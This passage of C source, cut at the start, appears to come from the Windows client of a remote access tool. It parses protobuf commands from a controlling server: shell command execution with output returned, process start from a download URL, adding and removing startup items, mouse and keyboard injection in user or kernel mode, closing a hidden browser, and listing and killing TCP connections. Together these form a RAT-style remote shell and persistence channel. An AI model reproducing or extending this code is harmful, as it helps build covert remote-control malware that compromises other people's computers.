            i += consumed;
        } else if (wire == 2) {
            unsigned int len_consumed = 0;
            unsigned int len = read_varint(body + i, body_len - i, &len_consumed);
            if (len_consumed == 0 || i + len_consumed + len > body_len) break;
            i += len_consumed + len;
        } else break;
    }
    return 0;
}

/* Parse DoProcessStart: field 1 DownloadUrl (string), 2 FilePath (string), 3 IsUpdate (varint). */
int remote_proto_decode_do_process_start(const unsigned char* body, unsigned int body_len, char* file_path_buf, unsigned int file_path_size, int* is_update) {
    if (!body || !file_path_buf || !file_path_size || !is_update) return 0;
    file_path_buf[0] = '\0';
    *is_update = 0;
    unsigned int i = 0;
    while (i + 2 <= body_len) {
        unsigned char tag = body[i++];
        unsigned int wire = tag & 7;
        unsigned int field = tag >> 3;
        if (wire == 0) {
            unsigned int consumed = 0;
            unsigned int v = read_varint(body + i, body_len - i, &consumed);
            if (consumed == 0) break;
            if (field == 3) *is_update = (v != 0) ? 1 : 0;
            i += consumed;
        } else if (wire == 2) {
            unsigned int len_consumed = 0;
            unsigned int len = read_varint(body + i, body_len - i, &len_consumed);
            if (len_consumed == 0 || i + len_consumed + len > body_len) break;
            i += len_consumed;
            if (field == 2) {
                if (len < file_path_size) {
                    memcpy(file_path_buf, body + i, len);
                    file_path_buf[len] = '\0';
                }
            }
            i += len;
        } else break;
    }
    return 1;
}

/* Encode DoProcessResponse: field 1 Action (varint), 2 Result (varint). */
unsigned int remote_proto_encode_do_process_response(int action, int result, unsigned char* out, unsigned int out_size) {
    if (!out || out_size < 8) return 0;
    unsigned int pos = 0;
    out[pos++] = (unsigned char)TAG(1, WIRE_VARINT);
    pos += put_varint((unsigned int)(action < 0 ? 0 : (action > 1 ? 1 : action)), out + pos);
    out[pos++] = (unsigned char)TAG(2, WIRE_VARINT);
    pos += put_varint((unsigned int)(result ? 1 : 0), out + pos);
    return pos;
}

/* Parse StartupItem nested message: field 1 Name, 2 Path, 3 Type. Fills name_buf, path_buf, type_val. */
static int parse_startup_item(const unsigned char* buf, unsigned int len, char* name_buf, unsigned int name_size, char* path_buf, unsigned int path_size, unsigned int* type_val) {
    if (!buf || !name_buf || !name_size || !path_buf || !path_size || !type_val) return 0;
    name_buf[0] = '\0';
    path_buf[0] = '\0';
    *type_val = 0;
    unsigned int i = 0;
    while (i + 2 <= len) {
        unsigned char tag = buf[i++];
        unsigned int wire = tag & 7;
        unsigned int field = tag >> 3;
        if (wire == 0) {
            unsigned int consumed = 0;
            unsigned int v = read_varint(buf + i, len - i, &consumed);
            if (consumed == 0) break;
            if (field == 3) *type_val = v;
            i += consumed;
        } else if (wire == 2) {
            unsigned int len_consumed = 0;
            unsigned int flen = read_varint(buf + i, len - i, &len_consumed);
            if (len_consumed == 0 || i + len_consumed + flen > len) break;
            i += len_consumed;
            if (field == 1) {
                if (flen < name_size) { memcpy(name_buf, buf + i, flen); name_buf[flen] = '\0'; }
            } else if (field == 2) {
                if (flen < path_size) { memcpy(path_buf, buf + i, flen); path_buf[flen] = '\0'; }
            }
            i += flen;
        } else break;
    }
    return (name_buf[0] != '\0') ? 1 : 0;
}

/* Parse DoStartupItemAdd: field 1 StartupItem (tag 0x0A). Scan for any field 1 wire 2 in body (protobuf field order may vary). */
int remote_proto_decode_do_startup_item_add(const unsigned char* body, unsigned int body_len, char* name_buf, unsigned int name_size, char* path_buf, unsigned int path_size, unsigned int* type_val) {
    if (!body || body_len < 2 || !name_buf || !path_buf || !type_val) return 0;
    unsigned int i = 0;
    while (i < body_len) {
        unsigned char tag = body[i++];
        unsigned int wire = tag & 7;
        unsigned int field = tag >> 3;
        if (wire == 0) {
            unsigned int consumed = 0;
            (void)read_varint(body + i, body_len - i, &consumed);
            if (consumed == 0) break;
            i += consumed;
        } else if (wire == 2) {
            unsigned int len_consumed = 0;
            unsigned int flen = read_varint(body + i, body_len - i, &len_consumed);
            if (len_consumed == 0 || i + len_consumed + flen > body_len) break;
            i += len_consumed;
            if (field == 1 && parse_startup_item(body + i, flen, name_buf, name_size, path_buf, path_size, type_val))
                return 1;
            i += flen;
        } else break;
    }
    return 0;
}

/* Parse DoStartupItemRemove: field 1 StartupItem (0x0A len msg). */
int remote_proto_decode_do_startup_item_remove(const unsigned char* body, unsigned int body_len, char* name_buf, unsigned int name_size, unsigned int* type_val) {
    if (!body || body_len < 3 || !name_buf || !type_val) return 0;
    char path_dummy[MAX_PATH];
    return remote_proto_decode_do_startup_item_add(body, body_len, name_buf, name_size, path_dummy, sizeof(path_dummy), type_val);
}

/* Parse DoShellExecute: field 1 Command (string). Unwrap 0x42 only. Do NOT unwrap BA/6A - they can
 * contain multiple top-level fields (e.g. BA 01 02 08 01 = field 23 + field 1). Parse top-level directly. */
int remote_proto_decode_do_shell_execute(const unsigned char* body, unsigned int body_len, char* command_buf, unsigned int command_size) {
    if (!body || body_len < 1 || !command_buf || command_size == 0) return 0;
    command_buf[0] = '\0';
    const unsigned char* parse = body;
    unsigned int parse_len = body_len;
    unwrap_optional_42(body, body_len, &parse, &parse_len);
    /* Direct field 1 (0x0A) string: common when no wrapper. */
    if (parse_len >= 2 && parse[0] == 0x0A) {
        unsigned int len_consumed = 0;
        unsigned int flen = read_varint(parse + 1, parse_len - 1, &len_consumed);
        if (len_consumed > 0 && 1u + len_consumed + flen <= parse_len && flen < command_size) {
            memcpy(command_buf, parse + 1 + len_consumed, flen);
            command_buf[flen] = '\0';
            return 1;
        }
    }
    unsigned int i = 0;
    while (i < parse_len) {
        unsigned char tag = parse[i++];
        unsigned int wire = tag & 7;
        unsigned int field = tag >> 3;
        if (wire == 0) {
            unsigned int consumed = 0;
            unsigned int v = read_varint(parse + i, parse_len - i, &consumed);
            if (consumed == 0) break;
            if (field == 1) {
                /* Server may send Command as varint 0/1 for empty (protobuf-net quirk). */
                command_buf[0] = '\0';
                return 1;
            }
            i += consumed;
        } else if (wire == 2) {
            unsigned int len_consumed = 0;
            unsigned int flen = read_varint(parse + i, parse_len - i, &len_consumed);
            if (len_consumed == 0 || i + len_consumed + flen > parse_len) break;
            i += len_consumed;
            if (field == 1) {
                if (flen < command_size) {
                    memcpy(command_buf, parse + i, flen);
                    command_buf[flen] = '\0';
                }
                return 1;
            }
            i += flen;
        } else break;
    }
    return 0;
}

/* Encode DoShellExecuteResponse: field 1 Output (string, allow empty), field 2 IsError (varint). */
unsigned int remote_proto_encode_do_shell_execute_response(const char* output, int is_error, unsigned char* out, unsigned int out_size) {
    if (!out || out_size < 8) return 0;
    unsigned int pos = 0;
    size_t slen = output ? strlen(output) : 0;
    if (slen > 0xFFFF) slen = 0xFFFF;
    out[pos++] = (unsigned char)TAG(1, WIRE_LEN);
    pos += put_varint((unsigned int)slen, out + pos);
    if (pos + (unsigned int)slen > out_size) return 0;
    if (output && slen) memcpy(out + pos, output, (unsigned int)slen);
    pos += (unsigned int)slen;
    out[pos++] = (unsigned char)TAG(2, WIRE_VARINT);
    pos += put_varint((unsigned int)(is_error ? 1 : 0), out + pos);
    return pos;
}

unsigned int remote_proto_encode_kernel_input_init_response(int success, const char* error_message, unsigned char* out, unsigned int out_size) {
    if (!out || out_size < 16) return 0;
    unsigned int pos = 0;
    out[pos++] = (unsigned char)TAG(1, WIRE_VARINT);
    pos += put_varint((unsigned int)(success ? 1 : 0), out + pos);
    size_t slen = error_message ? strlen(error_message) : 0;
    if (slen > 0xFFFF) slen = 0xFFFF;
    if (slen > 0) {
        out[pos++] = (unsigned char)TAG(2, WIRE_LEN);
        pos += put_varint((unsigned int)slen, out + pos);
        if (pos + (unsigned int)slen > out_size) return 0;
        memcpy(out + pos, error_message, (unsigned int)slen);
        pos += (unsigned int)slen;
    }
    return pos;
}

unsigned int remote_proto_encode_close_hidden_browser_result(int result, const char* message, unsigned char* out, unsigned int out_size) {
    if (!out || out_size < 16) return 0;
    unsigned int pos = 0;
    out[pos++] = (unsigned char)TAG(1, WIRE_VARINT);
    pos += put_varint((unsigned int)(result < 0 ? 0 : (result > 2 ? 0 : result)), out + pos);
    if (message && message[0]) {
        size_t slen = strlen(message);
        if (slen > 0xFFFF) slen = 0xFFFF;
        out[pos++] = (unsigned char)TAG(2, WIRE_LEN);
        pos += put_varint((unsigned int)slen, out + pos);
        if (pos + (unsigned int)slen > out_size) return 0;
        memcpy(out + pos, message, (unsigned int)slen);
        pos += (unsigned int)slen;
    }
    return pos;
}

/* GetConnectionsResponse: field 1 repeated TcpConnection. Each: 1 ProcessName, 2 LocalAddress, 3 LocalPort, 4 RemoteAddress, 5 RemotePort, 6 State. */
static unsigned int put_tcp_connection(unsigned char* out, unsigned int out_size, const char* process_name,
    const char* local_addr, unsigned int local_port, const char* remote_addr, unsigned int remote_port, unsigned int state) {
    if (!out || out_size < 64) return 0;
    unsigned char conn_buf[512];
    unsigned int conn_pos = 0;
    unsigned int n;
    n = put_string(conn_buf + conn_pos, sizeof(conn_buf) - conn_pos, 1, process_name);
    if (!n) return 0;
    conn_pos += n;
    n = put_string(conn_buf + conn_pos, sizeof(conn_buf) - conn_pos, 2, local_addr);
    if (!n) return 0;
    conn_pos += n;
    conn_buf[conn_pos++] = (unsigned char)TAG(3, WIRE_VARINT);
    conn_pos += put_varint(local_port, conn_buf + conn_pos);
    n = put_string(conn_buf + conn_pos, sizeof(conn_buf) - conn_pos, 4, remote_addr);
    if (!n) return 0;
    conn_pos += n;
    conn_buf[conn_pos++] = (unsigned char)TAG(5, WIRE_VARINT);
    conn_pos += put_varint(remote_port, conn_buf + conn_pos);
    conn_buf[conn_pos++] = (unsigned char)TAG(6, WIRE_VARINT);
    conn_pos += put_varint(state, conn_buf + conn_pos);
    unsigned int pos = 0;
    out[pos++] = (unsigned char)TAG(1, WIRE_LEN);
    pos += put_varint(conn_pos, out + pos);
    if (pos + conn_pos > out_size) return 0;
    memcpy(out + pos, conn_buf, conn_pos);
    return pos + conn_pos;
}

unsigned int remote_proto_encode_get_connections_response(unsigned char* out, unsigned int out_size) {
    if (!out || out_size < 256) return 0;
    DWORD size = 0;
    if (GetExtendedTcpTable(NULL, &size, TRUE, AF_INET, TCP_TABLE_OWNER_PID_ALL, 0) != ERROR_INSUFFICIENT_BUFFER)
        return 0;
    MIB_TCPTABLE_OWNER_PID* table = (MIB_TCPTABLE_OWNER_PID*)HeapAlloc(GetProcessHeap(), 0, size);
    if (!table) return 0;
    if (GetExtendedTcpTable(table, &size, TRUE, AF_INET, TCP_TABLE_OWNER_PID_ALL, 0) != NO_ERROR) {
        HeapFree(GetProcessHeap(), 0, table);
        return 0;
    }
    unsigned int pos = 0;
    char local_ip[32], remote_ip[32];
    char process_name[260];
    DWORD i;
    for (i = 0; i < table->dwNumEntries && pos + 600 < out_size; i++) {
        MIB_TCPROW_OWNER_PID* row = &table->table[i];
        struct in_addr la, ra;
        la.S_un.S_addr = row->dwLocalAddr;
        ra.S_un.S_addr = row->dwRemoteAddr;
        InetNtopA(AF_INET, &la, local_ip, sizeof(local_ip));
        InetNtopA(AF_INET, &ra, remote_ip, sizeof(remote_ip));
        unsigned short lp = ntohs((u_short)(row->dwLocalPort & 0xFFFF));
        unsigned short rp = ntohs((u_short)(row->dwRemotePort & 0xFFFF));
        _snprintf_s(process_name, sizeof(process_name), _TRUNCATE, "PID: %u", (unsigned)row->dwOwningPid);
        {
            char full_path[MAX_PATH];
            DWORD len = (DWORD)sizeof(full_path);
            HANDLE h = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, row->dwOwningPid);
            if (h && QueryFullProcessImageNameA(h, 0, full_path, &len) && len > 0) {
                const char* base = strrchr(full_path, '\\');
                base = base ? base + 1 : full_path;
                if (*base) _snprintf_s(process_name, sizeof(process_name), _TRUNCATE, "%s", base);
            }
            if (h) CloseHandle(h);
        }
        unsigned int conn_len = put_tcp_connection(out + pos, out_size - pos, process_name, local_ip, lp, remote_ip, rp, (unsigned)row->dwState);
        if (conn_len == 0) break;
        pos += conn_len;
    }
    HeapFree(GetProcessHeap(), 0, table);
    return pos;
}

/* Parse DoCloseConnection: field 1 LocalAddress (string), 2 LocalPort (varint), 3 RemoteAddress (string), 4 RemotePort (varint).
 * Server may wrap in field 8 (0x42) length-delimited envelope; unwrap if present. */
int remote_proto_decode_do_close_connection(const unsigned char* body, unsigned int body_len,
    char* local_addr_buf, unsigned int local_addr_size, unsigned short* local_port,
    char* remote_addr_buf, unsigned int remote_addr_size, unsigned short* remote_port) {
    if (!body || body_len < 2 || !local_addr_buf || !local_port || !remote_addr_buf || !remote_port) return 0;
    local_addr_buf[0] = '\0';
    remote_addr_buf[0] = '\0';
    *local_port = 0;
    *remote_port = 0;
    /* Unwrap field 8 (0x42) envelope if present */
    const unsigned char* parse = body;
    unsigned int parse_len = body_len;
    if (body_len >= 3 && body[0] == 0x42) {
        unsigned int len_consumed = 0;
        unsigned int inner_len = read_varint(body + 1, body_len - 1, &len_consumed);
        if (len_consumed > 0 && 1 + len_consumed + inner_len <= body_len) {
            parse = body + 1 + len_consumed;
            parse_len = inner_len;
        }
    }
    unsigned int i = 0;
    while (i < parse_len) {
        unsigned char tag = parse[i++];
        unsigned int wire = tag & 7;
        unsigned int field = tag >> 3;
        if (wire == 0) {
            unsigned int consumed = 0;
            unsigned int v = read_varint(parse + i, parse_len - i, &consumed);
            if (consumed == 0) break;
            if (field == 2) *local_port = (unsigned short)(v & 0xFFFF);
            else if (field == 4) *remote_port = (unsigned short)(v & 0xFFFF);
            i += consumed;
        } else if (wire == 5) {
            if (i + 4 > parse_len) break;
            if (field == 2) *local_port = (unsigned short)(parse[i] | (parse[i+1] << 8));
            else if (field == 4) *remote_port = (unsigned short)(parse[i] | (parse[i+1] << 8));
            i += 4;
        } else if (wire == 2) {
            unsigned int len_consumed = 0;
            unsigned int flen = read_varint(parse + i, parse_len - i, &len_consumed);
            if (len_consumed == 0 || i + len_consumed + flen > parse_len) break;
            i += len_consumed;
            if (field == 1) {
                if (flen < local_addr_size) { memcpy(local_addr_buf, parse + i, flen); local_addr_buf[flen] = '\0'; }
            } else if (field == 3) {
                if (flen < remote_addr_size) { memcpy(remote_addr_buf, parse + i, flen); remote_addr_buf[flen] = '\0'; }
            }
            i += flen;
        } else break;
    }
    return (local_addr_buf[0] != '\0' && remote_addr_buf[0] != '\0') ? 1 : 0;
}

/* Unwrap field 8 (0x42) envelope. */
static void unwrap_optional_42(const unsigned char* body, unsigned int body_len,
    const unsigned char** parse, unsigned int* parse_len) {
    *parse = body;
    *parse_len = body_len;
    if (body_len >= 3 && body[0] == 0x42) {
        unsigned int len_consumed = 0;
        unsigned int inner_len = read_varint(body + 1, body_len - 1, &len_consumed);
        if (len_consumed > 0 && 1u + len_consumed + inner_len <= body_len) {
            *parse = body + 1 + len_consumed;
            *parse_len = inner_len;
        }
    }
}

/* Parse DoMouseEvent: Action, IsMouseDown, X, Y, MonitorIndex, Mode. */
int remote_proto_decode_do_mouse_event(const unsigned char* body, unsigned int body_len,
    unsigned int* action, int* is_mouse_down, int* x, int* y, int* monitor_index, int* mode) {
    if (!body || body_len < 1 || !action || !is_mouse_down || !x || !y || !monitor_index || !mode) return 0;
    *action = 0; *is_mouse_down = 0; *x = 0; *y = 0; *monitor_index = 0; *mode = -1;
    const unsigned char* parse; unsigned int parse_len;
    unwrap_optional_42(body, body_len, &parse, &parse_len);
    /* Some serializers wrap the actual DoMouseEvent message in field 15 (tag 0x7A). Unwrap if present. */
    if (parse_len >= 2 && parse[0] == 0x7A) {
        unsigned int len_consumed = 0;
        unsigned int inner_len = read_varint(parse + 1, parse_len - 1, &len_consumed);
        if (len_consumed > 0 && 1u + len_consumed + inner_len <= parse_len) {
            parse = parse + 1 + len_consumed;
            parse_len = inner_len;
        }
    }
    unsigned int i = 0;
    while (i < parse_len) {
        unsigned char tag = parse[i++];
        unsigned int wire = tag & 7, field = tag >> 3;
        if (wire == 0) {
            unsigned int consumed = 0;
            unsigned int v = read_varint(parse + i, parse_len - i, &consumed);
            if (consumed == 0) break;
            if (field == 1) *action = v;
            else if (field == 2) *is_mouse_down = (v != 0);
            else if (field == 3) *x = (int)(v & 0x7FFFFFFFu);
            else if (field == 4) *y = (int)(v & 0x7FFFFFFFu);
            else if (field == 5) *monitor_index = (int)(v & 0x7FFFFFFFu);
            else if (field == 6) *mode = (v <= 1) ? (int)v : -1;
            i += consumed;
        } else if (wire == 5 && i + 4 <= parse_len) {
            unsigned int v = (unsigned int)(parse[i]|(parse[i+1]<<8)|(parse[i+2]<<16)|(parse[i+3]<<24));
            if (field == 1) *action = v; else if (field == 3) *x = (int)v; else if (field == 4) *y = (int)v; else if (field == 5) *monitor_index = (int)v; else if (field == 6) *mode = (v <= 1) ? (int)v : -1;
            i += 4;
        } else if (wire == 2) {
            unsigned int lc = 0, flen = read_varint(parse + i, parse_len - i, &lc);
            if (lc == 0 || i + lc + flen > parse_len) break;
            i += lc + flen;
        } else break;
    }
    return 1;
}

/* Parse DoKeyboardEvent: Key, KeyDown, Mode. */
int remote_proto_decode_do_keyboard_event(const unsigned char* body, unsigned int body_len, unsigned char* key, int* key_down, int* mode) {
    if (!body || body_len < 1 || !key || !key_down || !mode) return 0;
    *key = 0; *key_down = 0; *mode = -1;
    const unsigned char* parse; unsigned int parse_len;
    unwrap_optional_42(body, body_len, &parse, &parse_len);
    /* Some serializers wrap the actual DoKeyboardEvent message in field 13 (tag 0x6A). Unwrap if present. */
    if (parse_len >= 2 && parse[0] == 0x6A) {
        unsigned int len_consumed = 0;
        unsigned int inner_len = read_varint(parse + 1, parse_len - 1, &len_consumed);
        if (len_consumed > 0 && 1u + len_consumed + inner_len <= parse_len) {
            parse = parse + 1 + len_consumed;
            parse_len = inner_len;
        }
    }
    unsigned int i = 0;
    while (i < parse_len) {
        unsigned char tag = parse[i++];
        unsigned int wire = tag & 7, field = tag >> 3;
        if (wire == 0) {
            unsigned int consumed = 0;
            unsigned int v = read_varint(parse + i, parse_len - i, &consumed);
            if (consumed == 0) break;
            if (field == 1) *key = (unsigned char)(v & 0xFF);
            else if (field == 2) *key_down = (v != 0);
            else if (field == 3) *mode = (v <= 1) ? (int)v : -1;
            i += consumed;
        } else if (wire == 2) {
            unsigned int lc = 0, flen = read_varint(parse + i, parse_len - i, &lc);
            if (lc == 0 || i + lc + flen > parse_len) break;
            i += lc + flen;
        } else break;
    }
    return 1;
}

/* Close TCP connection: find row matching local+remote, set state to DELETE_TCB, call SetTcpEntry. Requires admin. */
int remote_proto_close_tcp_connection(const char* local_addr, unsigned short local_port, const char* remote_addr, unsigned short remote_port) {
    if (!local_addr || !remote_addr) return 0;
    struct in_addr la, ra;
    if (InetPtonA(AF_INET, local_addr, &la) != 1 || InetPtonA(AF_INET, remote_addr, &ra) != 1) return 0;
    DWORD dwLocalAddr = la.S_un.S_addr;
    DWORD dwRemoteAddr = ra.S_un.S_addr;
    DWORD size = 0;
    if (GetExtendedTcpTable(NULL, &size, TRUE, AF_INET, TCP_TABLE_OWNER_PID_ALL, 0) != ERROR_INSUFFICIENT_BUFFER) return 0;
    MIB_TCPTABLE_OWNER_PID* table = (MIB_TCPTABLE_OWNER_PID*)HeapAlloc(GetProcessHeap(), 0, size);
    if (!table) return 0;
    if (GetExtendedTcpTable(table, &size, TRUE, AF_INET, TCP_TABLE_OWNER_PID_ALL, 0) != NO_ERROR) {
        HeapFree(GetProcessHeap(), 0, table);
        return 0;
    }
    int ok = 0;
    DWORD i;
    for (i = 0; i < table->dwNumEntries; i++) {
        MIB_TCPROW_OWNER_PID* row = &table->table[i];
        unsigned short lp = ntohs((u_short)(row->dwLocalPort & 0xFFFF));
        unsigned short rp = ntohs((u_short)(row->dwRemotePort & 0xFFFF));
        if (row->dwLocalAddr == dwLocalAddr && row->dwRemoteAddr == dwRemoteAddr && lp == local_port && rp == remote_port) {
            MIB_TCPROW tcprow;
            tcprow.dwState = MIB_TCP_STATE_DELETE_TCB;
            tcprow.dwLocalAddr = row->dwLocalAddr;
            tcprow.dwLocalPort = row->dwLocalPort;
            tcprow.dwRemoteAddr = row->dwRemoteAddr;
            tcprow.dwRemotePort = row->dwRemotePort;
            if (SetTcpEntry(&tcprow) == NO_ERROR) ok = 1;
            break;
        }
    }
    HeapFree(GetProcessHeap(), 0, table);
    return ok;
}

/* Parse DoSetRemoteControlMode: field 1 Mode (0=User, 1=Kernel). Unwrap 0x42 or field 29 envelope if present. */
int remote_proto_decode_do_set_remote_control_mode(const unsigned char* body, unsigned int body_len, unsigned int* mode) {
    if (!body || body_len < 1 || !mode) return 0;
    *mode = 0;
    const unsigned char* parse = body;
    unsigned int parse_len = body_len;
    unwrap_optional_42(body, body_len, &parse, &parse_len);
    if (parse_len >= 2 && parse[0] == 0xE8) {
        unsigned int len_consumed = 0;
        unsigned int inner_len = read_varint(parse + 1, parse_len - 1, &len_consumed);
        if (len_consumed > 0 && 1u + len_consumed + inner_len <= parse_len) {
            parse = parse + 1 + len_consumed;
            parse_len = inner_len;
        }
    }
    unsigned int i = 0;
    while (i < parse_len) {
        unsigned char tag = parse[i++];
        unsigned int wire = tag & 7, field = tag >> 3;
        if (wire == 0) {
            unsigned int consumed = 0;
            unsigned int v = read_varint(parse + i, parse_len - i, &consumed);
            if (consumed == 0) break;
            if (field == 1) { *mode = (v <= 1) ? v : 0; return 1; }
            i += consumed;
        } else if (wire == 2) {
            unsigned int lc = 0, flen = read_varint(parse + i, parse_len - i, &lc);
            if (lc == 0 || i + lc + flen > parse_len) break;
            i += lc + flen;
        } else break;
    }
    return 0;
}

/* Parse DoShutdownAction: field 1 Action (varint). Unwrap field 8 (0x42) envelope if present. */
int remote_proto_decode_do_shutdown_action(const unsigned char* body, unsigned int body_len, unsigned int* action) {
    if (!body || body_len < 1 || !action) return 0;
    *action = 0;
    const unsigned char* parse = body;
    unsigned int parse_len = body_len;
    if (body_len >= 3 && body[0] == 0x42) {
        unsigned int len_consumed = 0;
        unsigned int inner_len = read_varint(body + 1, body_len - 1, &len_consumed);
        if (len_consumed > 0 && 1 + len_consumed + inner_len <= body_len) {
            parse = body + 1 + len_consumed;
            parse_len = inner_len;
        }
    }
    unsigned int i = 0;
    while (i < parse_len) {
        unsigned char tag = parse[i++];
        unsigned int wire = tag & 7;
        unsigned int field = tag >> 3;
        if (wire == 0) {
            unsigned int consumed = 0;
            unsigned int v = read_varint(parse + i, parse_len - i, &consumed);
            if (consumed == 0) break;
            if (field == 1) { *action = (v <= 2) ? v : 0; return 1; }
            i += consumed;
        } else if (wire == 5 && i + 4 <= parse_len) {
            if (field == 1) {
                unsigned int v = (unsigned int)(parse[i] | (parse[i+1]<<8) | (parse[i+2]<<16) | (parse[i+3]<<24));
                *action = (v <= 2) ? v : 0;
                return 1;
            }
            i += 4;
        } else if (wire == 2) {
            unsigned int len_consumed = 0;
            unsigned int flen = read_varint(parse + i, parse_len - i, &len_consumed);
            if (len_consumed == 0 || i + len_consumed + flen > parse_len) break;
            i += len_consumed + flen;
        } else break;
    }
    return 0;
}
